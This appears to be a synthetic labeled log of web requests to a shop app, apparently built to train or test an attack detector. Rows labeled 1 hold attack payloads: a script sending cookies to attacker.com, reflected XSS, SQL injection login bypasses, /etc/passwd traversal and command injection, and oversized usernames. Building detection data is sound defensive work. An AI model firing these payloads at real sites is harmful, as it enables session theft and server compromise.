+07:50:57.3,192.168.1.55,POST,/auth/register,"{'csrf_token': 'ImyBCHHHrB4pmwsY2eQTrZTadsBmRsoZR6Fg4rWBrP'.RtXrLSAu.HWUfxcurX5PsIU4wAzQhHxFY7mbJ, 'username': 'newuser33', 'email': 'a20@b.com', 'password': 't4uo$DPI!bOl', 'submit': 'Register'}",0
+07:50:59.4,192.168.1.165,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:51:01.2,203.162.4.190,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:51:03.3,103.75.118.228,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:51:04.8,103.75.118.228,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:51:06.8,192.168.1.182,GET,/order/myorders,,0
+07:51:09.6,203.162.4.190,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:51:10.9,203.162.4.190,GET,/,,0
+07:51:13.6,203.162.4.190,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:51:15.2,103.75.118.228,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:51:17.0,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
+07:51:19.0,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
+07:51:21.5,203.162.4.191,GET,/search?q=<script>alert('XSS')</script>,,1
+07:51:23.7,192.168.1.182,GET,/auth/login,,0
+07:51:25.2,127.0.0.1,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:51:27.6,192.168.1.151,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:51:29.4,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
+07:51:31.7,127.0.0.1,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:51:33.6,192.168.1.50,GET,/auth/register,,0
+07:51:35.0,203.162.4.190,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:51:37.0,103.75.118.228,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:51:39.0,103.75.118.228,GET,/search?q=<script>alert('XSS')</script>,,1
+07:51:40.8,192.168.1.141,POST,/search,{'query': 'iphone 15 pro max'},0
+07:51:42.9,203.162.4.191,GET,/../../../../etc/passwd,,1
+07:51:45.4,103.75.118.228,GET,/search?q=' OR 1=1; --,,1
+07:51:46.8,192.168.1.144,POST,/auth/login,"{'csrf_token': 'ImKiF1l5fCJ9gBKVyHLAVqsu2YC9OUzSQm8cKHwViN'.LYi16epI.Pj1jTzUxC2UOMyf3oVOyUBoI4qf3, 'username': 'user41', 'password': ')XfZP^*jUx)4', 'submit': 'Log in'}",0
+07:51:49.0,192.168.1.144,POST,/auth/login,"{'csrf_token': 'ImRGg0HxSiI5gXfdXuvXAqmR2AbRpzkRN1O5aoUTO2'.itSYnYSC.Dqn5oTr8RhEevz8zvFMEBoi5yJlo, 'username': 'user24', 'password': 'XQELDvtHD%$M', 'submit': 'Log in'}",0
+07:51:51.3,103.75.118.228,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:51:53.0,192.168.1.46,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:51:55.2,10.0.0.15,GET,/,,0
+07:51:57.4,203.162.4.190,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:51:59.1,203.162.4.190,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:52:01.2,192.168.1.141,GET,/auth/register,,0
+07:52:03.2,192.168.1.167,POST,/auth/login,"{'csrf_token': 'Img21DXtK6GZeRWL3WyWS7Fatc1wFwKrXdvazaCa76'.S0V0DjHo.VUKVEeYnxWYvfwyHr8mH-EAc6Yyl, 'username': 'user71', 'password': 'fty($Kh*SIdT', 'submit': 'Log in'}",0
+07:52:04.8,192.168.1.141,POST,/search,{'query': 'iphone 15 pro max'},0
+07:52:07.5,192.168.1.197,GET,/auth/logout,,0
+07:52:09.4,10.0.0.79,GET,/product/1,,0
+07:52:11.0,203.162.4.191,GET,/product/1' AND 1=1,,1
+07:52:13.3,10.0.0.28,GET,/product/1,,0
+07:52:15.7,103.75.118.228,GET,/search?q=' OR 1=1; --,,1
+07:52:16.8,103.75.118.228,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:52:19.5,10.0.0.66,GET,/product/2,,0
+07:52:21.2,10.0.0.66,GET,/category/Iphone,,0
+07:52:23.7,203.162.4.190,GET,/product/1' AND 1=1,,1
+07:52:25.7,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:52:27.4,192.168.1.141,GET,/auth/login,,0
+07:52:29.5,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:52:31.1,10.0.0.195,GET,/product/1,,0
+07:52:33.6,203.162.4.190,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:52:35.1,203.162.4.191,GET,/auth/register,,0
+07:52:37.5,103.75.118.228,GET,/product/1' AND 1=1,,1
+07:52:39.7,192.168.1.104,GET,/auth/logout,,0
+07:52:40.9,192.168.1.162,POST,/auth/register,"{'csrf_token': 'ImfVkjhhQLRRg40SYVNwV3ZZ9YxmkLFzCVxTQ1FpC9'.fPzRVGSL.c7od1peCfL-FMN8zg0zBPdqe31u0, 'username': 'newuser29', 'email': 'a1@b.com', 'password': 'CwwF^1bR6@0T', 'submit': 'Register'}",0
+07:52:43.0,192.168.1.55,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:52:44.9,127.0.0.1,POST,/auth/register,"{'csrf_token': 'Im2fN1fDAJiaWMrhr2chffbo9E9uZKqZWGZwTiljR7'.hSPCZHTM.MUTKFSqaXC8TK9HPbeEBTIikI_uB, 'username': 'newuser6', 'email': 'a50@b.com', 'password': '2NcWcO4))aNG', 'submit': 'Register'}",0
+07:52:47.7,127.0.0.1,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:52:49.7,192.168.1.12,GET,/order/myorders,,0
+07:52:51.4,103.75.118.228,GET,/../../../../etc/passwd,,1
+07:52:53.2,203.162.4.191,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:52:55.5,203.162.4.190,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:52:56.9,103.75.118.228,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:52:59.0,192.168.1.182,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:53:01.1,192.168.1.28,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:53:03.5,10.0.0.146,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:53:04.8,203.162.4.191,GET,/search?q=' OR 1=1; --,,1
+07:53:06.8,203.162.4.190,GET,/product/1' AND 1=1,,1
+07:53:08.8,10.0.0.106,POST,/auth/login,"{'csrf_token': 'ImVY7VuegE25GMyNjxG3ujnF5w8LEgQcAGhpDLS9nW'.EZ2FBbxA.bW8j9PmAi9N44u95-oqwWaDKuldV, 'username': 'user37', 'password': 'b*IytQJ2A*3U', 'submit': 'Log in'}",0
+07:53:11.1,203.162.4.190,GET,/order/cart,,0
+07:53:13.6,10.0.0.66,GET,/category/Iphone,,0
+07:53:15.7,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:53:17.7,10.0.0.28,GET,/product/2,,0
+07:53:19.7,10.0.0.106,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:53:21.6,203.162.4.190,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:53:23.5,10.0.0.195,POST,/auth/login,"{'csrf_token': 'ImrGRlcOu6sjnxAY2ToAtlerLCLXEDDXM8E57lHFOm'.Tm0Rfiy1.QDgNasalneCo3LLLbAfwzkGofaES, 'username': 'user47', 'password': 'eSOB^UGv@L0G', 'submit': 'Log in'}",0
+07:53:25.1,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:53:27.7,192.168.1.46,GET,/auth/register,,0
+07:53:29.3,203.162.4.191,GET,/../../../../etc/passwd,,1
+07:53:31.6,192.168.1.141,POST,/auth/login,"{'csrf_token': 'ImkqWxLHgCyKWRonlejVCb0ErfAcTR4aiUahrrJV8y'.pRLlC4va.5MU9dvvUQ5whaUhhVG-Dy_ZEpBqY, 'username': 'user1', 'password': 'oOBSEqGxrG2B', 'submit': 'Log in'}",0
+07:53:33.6,192.168.1.50,POST,/auth/login,"{'csrf_token': 'Im5CAZGVtxdniaM9CAE0aR4EQJgafqBI5Aocf8l5XF'.KchwxQsQ.5TQGUTAqF8NOyIOFdHnBUYI29Fdr, 'username': 'user7', 'password': '#tfL39D&tKs2', 'submit': 'Log in'}",0
+07:53:34.8,10.0.0.146,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:53:37.1,192.168.1.144,GET,/product/2,,0
+07:53:38.8,192.168.1.175,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:53:40.8,192.168.1.182,GET,/,,0
+07:53:43.6,103.75.118.228,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:53:45.3,192.168.1.46,POST,/auth/register,"{'csrf_token': 'ImtMGt85dmFL4K0Gc5qyFvbHL0d84fabMN92I6krQA'.9NVJ062c.Jjd6oDcA7FjrFOUE0OJxelQNvEos, 'username': 'newuser58', 'email': 'a52@b.com', 'password': '4e7hhXA5kWji', 'submit': 'Register'}",0
+07:53:47.6,203.162.4.191,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:53:48.8,192.168.1.144,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:53:51.5,203.162.4.190,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:53:53.1,10.0.0.146,GET,/auth/register,,0
+07:53:55.4,192.168.1.197,GET,/,,0
+07:53:57.4,203.162.4.191,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:53:59.0,10.0.0.15,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:54:01.7,192.168.1.167,GET,/product/1,,0
+07:54:02.9,203.162.4.190,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:54:05.4,10.0.0.67,POST,/search,{'query': 'iphone 15 pro max'},0
+07:54:07.3,10.0.0.15,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:54:09.7,192.168.1.197,GET,/,,0
+07:54:11.6,10.0.0.176,GET,/product/1,,0
+07:54:13.2,10.0.0.28,GET,/auth/login,,0
+07:54:15.1,192.168.1.22,POST,/auth/login,"{'csrf_token': 'ImshlNcrBx6fmwe2f3Za9u9esTUJXs0ukY0jevwr9q'.61uZDGqu.W45nuXhJsUha1o00aR8cYM0oH8kY, 'username': 'user99', 'password': 'Y^iM&ip6Gopf', 'submit': 'Log in'}",0
+07:54:16.9,10.0.0.67,GET,/category/Iphone,,0
+07:54:19.2,203.162.4.190,GET,/order/cart,,0
+07:54:21.1,203.162.4.191,GET,/,,0
+07:54:22.8,192.168.1.18,GET,/order/myorders,,0
+07:54:25.7,203.162.4.191,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:54:27.4,192.168.1.55,GET,/order/cart,,0
+07:54:29.4,203.162.4.190,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:54:30.8,203.162.4.190,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:54:33.1,103.75.118.228,GET,/product/1' AND 1=1,,1
+07:54:35.7,127.0.0.1,GET,/,,0
+07:54:37.7,10.0.0.15,POST,/auth/login,"{'csrf_token': 'Im9bjZVtVQdFyhNGwFYVBTmJx8kZSwYFwNzaijl7JJ'.vKC0MKk8.K2Hw8u1F39DSIGN3h424Y-scD6cx, 'username': 'user59', 'password': 'dHqxK7pe3eHW', 'submit': 'Log in'}",0
+07:54:39.6,10.0.0.67,POST,/search,{'query': 'iphone 15 pro max'},0
+07:54:40.9,203.162.4.191,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:54:43.5,10.0.0.106,POST,/auth/login,"{'csrf_token': 'Im7M6E5g1mleiaFRujXclz6ePYEgp63RHkewFtUOrE'.oQ8OUaM0.XgiajqHF2llfgiV4zHRM2BQCuTe1, 'username': 'user17', 'password': 'RfM(6FwTk5$9', 'submit': 'Log in'}",0
+07:54:45.6,192.168.1.50,GET,/product/1,,0
+07:54:47.6,203.162.4.191,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:54:48.9,192.168.1.141,POST,/auth/register,"{'csrf_token': 'ImDExJ8Sub3LZJ4urbI05dsoZ5MeDWykFm3rbQMiCo'.7xWepUKg.gAR6X3fA0FOxLu_GFk8TJn-KpjIo, 'username': 'newuser69', 'email': 'a70@b.com', 'password': 'KOqt*wo*iAxd', 'submit': 'Register'}",0
+07:54:51.2,203.162.4.190,GET,/search?q=' OR 1=1; --,,1
+07:54:53.1,103.75.118.228,GET,/../../../../etc/passwd,,1
+07:54:55.6,127.0.0.1,GET,/auth/login,,0
+07:54:57.0,10.0.0.146,GET,/auth/register,,0
+07:54:59.3,103.75.118.228,GET,/../../../../etc/passwd,,1
+07:55:00.9,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:55:02.9,192.168.1.12,POST,/search,{'query': 'iphone 15 pro max'},0
+07:55:05.6,103.75.118.228,GET,/product/1' AND 1=1,,1
+07:55:07.7,10.0.0.79,POST,/search,{'query': 'iphone 15 pro max'},0
+07:55:09.6,10.0.0.28,GET,/order/cart,,0
+07:55:11.7,10.0.0.15,POST,/auth/register,"{'csrf_token': 'ImnfByM9NjfUbqZdxVl3fCZhg9796tCClSFxMLxrMP'.zugNdi74.SdtRDVp9svSCb_vpnfTCjnfQadrH, 'username': 'newuser48', 'email': 'a2@b.com', 'password': '13WvaxAVZHxE', 'submit': 'Register'}",0
+07:55:13.2,203.162.4.191,GET,/search?q=' OR 1=1; --,,1
+07:55:15.5,192.168.1.18,POST,/auth/register,"{'csrf_token': 'ImLsp4WdpsDnJSkNb2hAi2auvUq7yyhCH3DGrasPUm'.sOs7KkDa.cjXE1gSOTOry0-Rtz3arD1uPLJs3, 'username': 'newuser12', 'email': 'a84@b.com', 'password': '!7LP9eI9PaZf', 'submit': 'Register'}",0
+07:55:17.1,192.168.1.197,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:55:19.7,203.162.4.190,GET,/order/cart,,0
+07:55:21.7,10.0.0.28,GET,/auth/register,,0
+07:55:23.6,10.0.0.195,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:55:25.7,192.168.1.175,GET,/product/1,,0
+07:55:27.2,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:55:29.2,192.168.1.18,POST,/auth/login,"{'csrf_token': 'Imny9tkNFpfxT9hXE5lnrvOulxg23Vn8orVfNdCGVn'.YSu4falH.p3PX5NNxJ6swDTVf4Cpm6Ykk7s58, 'username': 'user92', 'password': 'ahaG90uIFjXo', 'submit': 'Log in'}",0
+07:55:30.9,10.0.0.82,GET,/auth/login,,0
+07:55:33.4,203.162.4.191,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:55:35.4,192.168.1.169,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:55:37.7,203.162.4.191,GET,/product/1' AND 1=1,,1
+07:55:39.7,103.75.118.228,GET,/search?q=' OR 1=1; --,,1
+07:55:41.3,10.0.0.28,POST,/auth/login,"{'csrf_token': 'ImAAPnrXFbcJvPvJjbZgbasbxezibNov7E3ITYPGxB'.8YBged8e.Q-dw1OzPshit4YBZRRk0EoJsQLH-, 'username': 'user23', 'password': 'PNxvzCFHGatN', 'submit': 'Log in'}",0
+07:55:43.7,192.168.1.46,GET,/order/myorders,,0
+07:55:45.0,192.168.1.18,GET,/category/Iphone,,0
+07:55:47.4,192.168.1.167,GET,/auth/logout,,0
+07:55:49.5,203.162.4.191,GET,/../../../../etc/passwd,,1
+07:55:51.5,192.168.1.104,GET,/product/2,,0
+07:55:53.4,127.0.0.1,POST,/search,{'query': 'iphone 15 pro max'},0
+07:55:55.2,103.75.118.228,GET,/search?q=<script>alert('XSS')</script>,,1
+07:55:57.0,192.168.1.165,GET,/product/1,,0
+07:55:59.5,192.168.1.104,POST,/auth/register,"{'csrf_token': 'ImmDAtlsulaCdkvJErauo00WzvE7vEKnpTgyJ2oKr7'.ayFe9ocq.d5T6QmvvyI6KHggqrit6X3-o9dX1, 'username': 'newuser69', 'email': 'a100@b.com', 'password': 'pScJWW@6R$Ih', 'submit': 'Register'}",0
+07:56:01.1,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:56:02.9,192.168.1.22,GET,/order/myorders,,0
+07:56:05.4,192.168.1.151,POST,/auth/login,"{'csrf_token': 'ImahxcSlkEH93lKzKlP1X01yIRJoQvkOdciP7nFXYL'.o4eK5E1c.CsD8pGDWWfqLMkDkF0HVR6AtAwWb, 'username': 'user22', 'password': 's9^#D3(n%UKT', 'submit': 'Log in'}",0
+07:56:07.0,203.162.4.190,GET,/product/1' AND 1=1,,1
+07:56:08.8,203.162.4.191,GET,/product/1' AND 1=1,,1
+07:56:10.8,192.168.1.46,POST,/auth/login,"{'csrf_token': 'ImWuuCt2nVntuUAqZnbZij3f0IrJm9lq2jggdy25zt'.N93XLGil.Iu0GpBTSk2aU-HMnFC-IWquALpvI, 'username': 'user87', 'password': 'RQ5Bxw^G0yt8', 'submit': 'Log in'}",0
+07:56:13.1,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:56:15.3,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:56:17.3,203.162.4.190,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:56:19.5,203.162.4.190,GET,/search?q=' OR 1=1; --,,1
+07:56:21.7,203.162.4.191,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:56:23.5,192.168.1.197,POST,/auth/login,"{'csrf_token': 'ImsyVK6sQjlOF9HiLRqL1f0AejPzQavlVdrvi6KbbU'.oxpM3gre.6WU_0lRABNLvgbXVgSQx0OLoNJmd, 'username': 'user57', 'password': 'rJwj99Np8^LD', 'submit': 'Log in'}",0
+07:56:25.3,203.162.4.190,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:56:27.7,192.168.1.18,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:56:28.8,203.162.4.191,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:56:30.8,103.75.118.228,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:56:33.6,192.168.1.197,GET,/auth/login,,0
